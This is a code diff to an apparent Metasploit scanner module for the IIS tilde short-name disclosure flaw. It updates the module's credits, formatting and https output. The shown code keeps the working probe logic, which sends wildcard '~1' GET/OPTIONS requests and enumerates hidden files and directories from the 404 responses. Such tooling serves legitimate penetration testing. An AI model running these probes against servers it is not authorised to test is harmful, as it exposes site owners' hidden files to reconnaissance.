@@ -15,17 +15,17 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name'        => 'Microsoft IIS shortname vulnerability scanner',
         'Description' => %q{
-        'The vulnerability is caused by a tilde character "~" in a GET or OPTIONS request, which
-         could allow remote attackers to diclose 8.3 filenames (short names). This is a new
-         technique for an existing bug (CVE-2009-4444), which relied on the use of the ;(semicolon)
-         character. Soroush Dalili discovered the original bug, while the new ~ technique was
-         discovered by Soroush Dalili and Ali Abbasnejad. Older IIS installations are vulnerable
-         with GET, newer installations with OPTIONS'
+         The vulnerability is caused by a tilde character "~" in a GET or OPTIONS request, which
+         could allow remote attackers to diclose 8.3 filenames (short names). In 2010, Soroush Dalili
+	 and Ali Abbasnejad discovered the original bug (GET request). This was publicly disclosed in
+         2012. In 2014, Soroush Dalili discovered that newer IIS installations are vulnerable with OPTIONS.
         },
         'Author'         =>
           [
-          'MinatoTW <shaks19jais[at]gmail.com>',
-          'egre55 <ianaustin[at]protonmail.com>'
+          'Soroush Dalili', # Vulnerability discovery
+          'Ali Abbasnejad', # Vulnerability discovery
+          'MinatoTW <shaks19jais[at]gmail.com>', # Metasploit module
+          'egre55 <ianaustin[at]protonmail.com>' # Metasploit module
           ],
         'License'     => MSF_LICENSE,
         'References'     =>
@@ -84,31 +84,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def is_vul
-      for method in ['GET', 'OPTIONS']
-        res1 = send_request_cgi({
-          'uri' => normalize_uri(datastore['PATH'], '*~1*'),
-          'method' => method
-        })
+    for method in ['GET', 'OPTIONS']
+      res1 = send_request_cgi({
+        'uri' => normalize_uri(datastore['PATH'], '*~1*'),
+        'method' => method
+      })
 
-        res2 = send_request_cgi({
-          'uri' => normalize_uri(datastore['PATH'],'QYKWO*~1*'),
-          'method' => method
-        })
+      res2 = send_request_cgi({
+        'uri' => normalize_uri(datastore['PATH'],'QYKWO*~1*'),
+        'method' => method
+      })
 
-        if res1.code == 404 && res2.code != 404
-          vuln = 1
-          @verb = method
-          break
-        end
+      if res1.code == 404 && res2.code != 404
+        vuln = 1
+        @verb = method
+        break
       end
-      if vuln == 1
-        return true
-      else
-        return false
-      end
+    end
+    if vuln == 1
+      return true
+    else
+      return false
+    end
   rescue Rex::ConnectionError
     print_bad("Failed to connect to target")
-    end
+  end
 
   def get_status(f , digit , match)
     res2 = send_request_cgi({
@@ -155,7 +155,6 @@ class MetasploitModule < Msf::Auxiliary
         for c in @found2
           @queue_ext << (f + c )
         end
-      else
       end
     end
   end
@@ -251,30 +250,28 @@ class MetasploitModule < Msf::Auxiliary
         @threads << Thread.new { scan }
       }
 
-      sleep(1) until @queue_ext.empty?
+      Rex.sleep(1) until @queue_ext.empty?
 
       @threads.each(&:join)
+
+      proto = datastore['SSL'] ? 'https' : 'http'
+
       if @dirs.empty?
         print_status("No directories were found")
       else
-        print_good("Directories found")
+        print_good("Found #{@dirs.size} directories")
         @dirs.each do |x|
-          print_line("http://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
+          print_line("#{proto}://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
         end
       end
+
       if @files.empty?
         print_status("No files were found")
       else
-        print_good("Files found")
+        print_good("Found #{@files.size} files")
         @files.each do |x|
-          print_line("http://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
+          print_line("#{proto}://#{datastore['RHOST']}#{datastore['PATH']}#{x}")
         end
       end
     end
   end
-
-
-
-
-
-
